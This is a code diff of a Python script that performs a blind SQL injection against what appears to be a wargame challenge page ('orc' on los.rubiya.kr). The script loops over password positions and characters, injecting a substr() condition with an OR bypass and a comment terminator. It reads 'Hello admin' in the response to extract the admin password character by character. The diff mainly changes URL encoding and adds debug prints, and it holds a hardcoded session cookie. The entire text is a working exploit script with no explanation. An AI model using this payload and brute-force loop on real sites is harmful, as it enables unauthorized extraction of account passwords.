@@ -1,5 +1,6 @@
-# python 3.5.2
+# python 3.6.4
 import urllib.request
+import urllib.parse
 MyHeader = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36',
 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
@@ -12,16 +13,21 @@ pw=""
 arr="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
 for i in range(1,9):
 	for j in range(0,62):
-		# url="http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=*' || id='admin' and substr(pw,{0},1)='{ascii}' %23".format(i,ascii=arr[j])
-		url="http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=*' || id='admin' and substr(pw,{0},1)='{ascii}' %23".format(i,ascii=arr[j])
-		#r = urllib.request.Request(url,headers=MyHeader)
-		r = urllib.request.Request(url)
-		r.add_header("Cookie","PHPSESSID=1a1hlpne9kfc84ivkcmr5pd011")
-		# data = urllib.request.urlopen(r).read().decode("utf-8")
-		data = urllib.request.urlopen(r).read()
+		url="http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=*'%20||%20id='admin'%20and%20substr(pw,{0},1)='{ascii}'%23".format(i,ascii=arr[j])
+		print("1")
 		print(url)
-		if data.find("Hello admin") != -1 :
+		r = urllib.request.Request(url)
+		print("2")
+		r.add_header("Cookie","PHPSESSID=1a1hlpne9kfc84ivkcmr5pd011")
+		print("3")
+		data = urllib.request.urlopen(r)
+		print("4")
+		asdf = data.read().decode('utf-8')
+		if asdf.find("Hello admin") != -1 :
 			pw = pw + arr[j]
 			print("This is    "+arr[j])
 			break
 print(pw)
+
+
+
